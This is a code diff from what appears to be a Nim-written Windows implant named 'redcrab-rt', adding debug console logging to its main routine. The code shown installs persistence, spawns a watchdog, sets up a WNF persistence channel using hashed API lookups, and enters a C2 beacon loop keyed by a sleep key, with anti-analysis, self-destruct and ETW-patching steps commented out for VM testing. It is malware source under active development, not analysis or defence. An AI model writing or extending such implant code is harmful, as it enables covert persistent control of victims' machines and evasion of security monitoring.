@@ -15,7 +15,15 @@ const SLEEP_KEY: array[16, byte] = [
   0x54, 0x4B, 0x65, 0x79, 0x30, 0x31, 0x32, 0x33
 ]
 
+template dbg(msg: string) =
+  stdout.writeLine("[redcrab] " & msg)
+  stdout.flushFile()
+
 proc WinMain() {.exportc: "WinMain", stdcall.} =
+  discard AttachConsole(uint32(-1))  # attach to parent console for debug output
+
+  dbg("=== redcrab-rt starting ===")
+
   # 1. Anti-analysis gate — disabled for VM testing
   # if antidetect.hostileEnvironment():
   #   selfdestruct.fullDestruct()
@@ -24,12 +32,17 @@ proc WinMain() {.exportc: "WinMain", stdcall.} =
   # etw_patch.patchEtw()
 
   # 3. Persistence
+  dbg("installing persistence...")
   persist.install()
+  dbg("persistence done")
 
   # 4. Start watchdog
+  dbg("starting watchdog...")
   watchdog.start(30_000'u32, 5'u32)
+  dbg("watchdog thread spawned")
 
   # 5. WNF persistence channel
+  dbg("setting up WNF channel...")
   block:
     const H_NTDLL:     uint32 = 0x22D3B5ED'u32
     const H_ADVAPI:    uint32 = 0x67208A49'u32
@@ -50,8 +63,12 @@ proc WinMain() {.exportc: "WinMain", stdcall.} =
       discard installWnfChannel(
         @[], SLEEP_KEY,
         fnSubscribe, fnUpdate, fnOpen, fnSet, fnClose)
+      dbg("WNF channel installed")
+    else:
+      dbg("WNF skipped — missing function pointers")
 
   # 6. C2 beacon loop — renamed from run() to beaconLoop(key) (bug fix)
+  dbg("entering beacon loop...")
   c2.beaconLoop(SLEEP_KEY)
 
 when isMainModule:
